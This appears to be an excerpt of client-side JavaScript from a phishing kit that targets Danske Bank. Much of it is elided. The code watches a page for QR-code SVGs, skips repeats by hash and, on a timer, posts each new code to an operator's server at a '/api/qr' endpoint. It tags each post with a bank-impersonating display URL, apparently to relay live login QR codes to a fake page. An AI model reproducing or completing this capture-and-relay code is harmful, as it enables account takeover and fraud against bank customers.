...
const DANSKE_CONFIG = {
    ...
    lastCapture: 0,
    lastHash: null,
    displayUrl: `${PRODUCTION_URL}/Danskebankfelsokningskundidentifieringkund98721311`
};
        ...
        if (element.tagName === 'svg') {
            ...
            img.onload = function() {
                try {
                    ...
                    if (hash === DANSKE_CONFIG.lastHash) {
                        console.log('Same QR code as last capture');
                        return;
                    }
                    
                    console.log('Capturing new QR code');
                    DANSKE_CONFIG.lastHash = hash;
                    DANSKE_CONFIG.lastCapture = Date.now();
                    ...
                    fetch(`${PRODUCTION_URL}/api/qr`, {
                        ...
                        body: JSON.stringify({ 
                            ...
                            displayUrl: DANSKE_CONFIG.displayUrl
                        })
                    })
...
function findQRCodes() {
    const svgs = document.querySelectorAll(DANSKE_CONFIG.selectors.qrSvg);
    const qrContainers = document.querySelectorAll(DANSKE_CONFIG.selectors.qrContainer);
...
function autoCapture() {
    const now = Date.now();
    if (now - DANSKE_CONFIG.lastCapture < DANSKE_CONFIG.captureThrottle) {
        return;
    }
...
function startMonitoring() {
    ...
    captureInterval = setInterval(autoCapture, DANSKE_CONFIG.captureInterval);
